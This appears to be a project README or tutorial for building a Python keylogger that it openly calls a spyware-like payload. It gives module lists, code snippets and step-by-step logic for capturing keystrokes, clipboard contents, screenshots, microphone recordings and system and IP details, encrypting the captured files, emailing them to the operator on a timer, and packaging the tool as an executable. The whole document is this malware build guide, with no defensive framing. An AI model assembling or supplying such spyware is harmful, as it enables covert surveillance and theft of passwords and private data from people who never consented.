## This is an Advanced Keylogger - An improvised version of the Keylogger

An advanced keylogger has been created in Python which has the capability of sending emails, getting screenshots, recording your microphone, getting computer information, and the clipboard. All features work together to create both a keylogger and a spyware-like payload.

## GETTING STARTED – PYTHON, PYCHARM AND MODULES

**Before we start writing code, it’s important to ensure we have Python installed as well as the proper modules**

**Step One**: Go to https://www.python.org, navigate to the downloads section, and download the latest version of Python.

**Step Two**: Go through the setup wizard and make sure to install pip as well as add python to the path (screenshot credit: Data to Fish)

**Step Three**: Go to https://www.jetbrains.com/pycharm/download/#section=windows, under Community, choose the free download option. Go through the setup wizard using the default options.

**Step Four**: Open PyCharm once downloaded and select Create New Project (screenshot credit: BeginnersBook).

**Step Five**: Now you will download all packages/modules/dependencies for the project. There are multiple methods to do this, including using the pip tool or directly importing through PyCharm. We will be directly importing all packages in Python (because often permission and file paths can get messed up when using the pip tool).

To install a package through PyCharm, navigate to File --> Settings (CTRL + ALT + S).

Under settings, navigate to Project: Project Name, and select Project Interpreter.

In the Project Interpreter, click the + icon to add a new module.

When you have clicked on the + icon, a new window will pop open named Available Packages. We can search for each module/package and install it directly into our project. For example, to install the cryptography module, simply search “cryptography”, click the package which says cryptography, then click Install Package and wait for it to install.

Once the package has been successfully installed, we can move on to the next module to install. For this project, install all of the following modules (name is exactly the name of the package)

* pywin
* pynput
* scipy
* cryptography
* requests
* pillow
* sounddevice

Once we have imported all modules, we exit out all of the settings windows and wait a few minutes for each package to install.

We have successfully installed Python, PyCharm, and all required modules.

## CREATING FILES AND APPENDING TO FILES

**We will be appending data to files for multiple parts of the keylogger. Before we append data to files, we must first create variables with the proper extensions. Here are the variables we will need with the proper extensions.**

system_information = "system.txt" 
audio_information = "audio.wav" 
clipboard_information = "clipboard.txt" 
screenshot_information = "screenshot.png" 
keys_information = "key_log.txt"

We will also need 3 additional files for encryption, I simply used the e_file_name syntax for each file.

system_information_e = 'e_system.txt' 
clipboard_information_e = 'e_clipboard.txt' 
keys_information_e = 'e_keys_logged.txt'

To open and append to files, use the with open(file_path, “a”) as f :

To write to the file, simply use the f.write(data) method


## LOGGING KEYS

**To log keys using Python, we will be using the pynput module.**

Module to install:

from pynput.keyboard import Key, Listener

Key Ideas with pynput:

- pynput has multiple functions including on_press, write_file, and on_release
- to understand pynput, follow this tutorial: https://www.youtube.com/watch?v=TbMKwl11itQ

## EMAIL

**To add an email functionality, we will be using the email module.**

Modules to install:

from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
import smtplib

Key Ideas with email:

- To send with email, follow this tutorial: https://www.geeksforgeeks.org/send-mail-attachment-gmail- account-using-python/?ref=lbp

## COMPUTER INFORMATION

**To gather computer information, we will use socket and platform modules.**

Modules to install:

- import socket 
- import platform

Key Ideas with socket:

- The hostname = socket.gethostname() method gets the hostname
- To get the internal IP address, use socket.gethostbyname(hostname) method

Key ideas with platform:

- To receive processor information, use the platform.processor() method
- To get the system and version information use platform.system() and platform.version()
- To get the machine information, use the platform.machine() method

To get external (public facing) IP address, use api.ipify.org

- Use the get(‘https://api.ipify.org’).text to get external ip

## CLIPBOARD

**To get the clipboard information, we will be using the win32clipboard module, which is a submodule of pywin**

Module to install:

import win32clipboard

Key ideas with win32clipboard:

- The person may not have any writeable data for the clipboard (could have copied an image), so make sure to use a try–except block just in case information could not be copied.
- To open clipboard, use the win32clipboard.OpenClipboard()
- To get clipboard information, use the win32clipboard.GetClipboardData()
- To close the clipboard, use the win32clipboard.CloseClipboard()

## MICROPHONE

**To record with microphone, we will be using the sounddevice module and writing to a .wav file using the scipy.io.wavefile module.**

Module to install:

- from scipy.io.wavfile import write 
- import sounddevice as sd

Key ideas with sounddevice:

- Ensure to set the fs variable: fs = 44100
- Ensure to add a seconds variable: seconds = microphone_time
- To record, use the following code: myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2) sd.wait()
- To write the recording to a .wav file, use the following code: write(filepath, fs, myrecording)

## SCREENSHOT

**To take a screenshot, we will use the ImageGrab from the Pillow Module.**

Modules to install:

from multiprocessing import Process, freeze_support 
from PIL import ImageGrab

Key Ideas with ImageGrab:

- The ImageGrab.grab() method takes a screenshot
- To save the image, use the image_variable.save() method

To ensure only one screenshot is taken at a time, add freeze_support(). Use the following code below:

```
if name == “main”:

   freeze_support()

   Process(target=screenshot).start()
```

## BUILD THE TIMER

**To build a timer that goes through a certain number of iterations before the keylogger ends, we will be using the timer function.**

Use the following process:

1. Create an iterations variable and set its value to zero ( *iterations = 0* )
2. Create an end_iterations variable which sets to a certain amount of iterations before ending the keylogger ( *end_iterations = 5* )
3. Get the current time using the time.time() function, set this equal to a variable ( *currentTime = time.time()* )
4. Create a time_iteration variable that collects the keylogs for a certain period of time in seconds ( *time_iteration = 15* )
5. Get the stoppingTime by adding the time.time() function + time_iteration to stop, set this equal to a variable ( *stoppingTime = time.time() + time_iteration* )
6. while iterations is less than (<) the ending_iterations... 
    a. log keys
7. If the current time is greater than (>) the stopping time... 
    a. Take a screenshot 
    b. Send screenshot to email 
    c. Gather clipboard contents 
    d. Add 1 to the iterations variable 
    e. Get new current time
    f. Get a new stopping time

## ENCRYPTION OF FILES

**To encrypt files, we will use the cryptography.fernet module.**

Module to import:

from cryptography.fernet import Fernet

Key ideas to remember for the encryption module:

- Use the following tutorial:

## EXECUTABLE

**Converting our Python Keylogger to an executable can be a little tricky. Python isn’t very good at converting scripts and programs into executables because there are often many dependencies (modules) that have to be downloaded. To turn this keylogger into an executable, I recommend using one of two programs... I have included some helpful tutorials which can help you convert your Python programs into executables.**
